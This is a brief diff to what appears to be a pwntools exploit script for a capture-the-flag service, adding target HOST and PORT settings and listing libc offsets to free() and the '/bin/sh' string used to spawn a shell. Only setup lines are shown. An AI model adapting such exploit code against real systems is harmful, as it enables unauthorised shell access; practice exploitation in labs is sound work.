@@ -1,6 +1,9 @@
-#!/usr/bin/python
+#!/usr/bin/env python2
 from pwn import *
 import sys
+
+HOST = ''
+PORT = 40010
 
 LIBC    = 0x097950  # offset from free() to the libc base
 BINSH   = 0x1b3e9a  # offset from base to "/bin/sh"
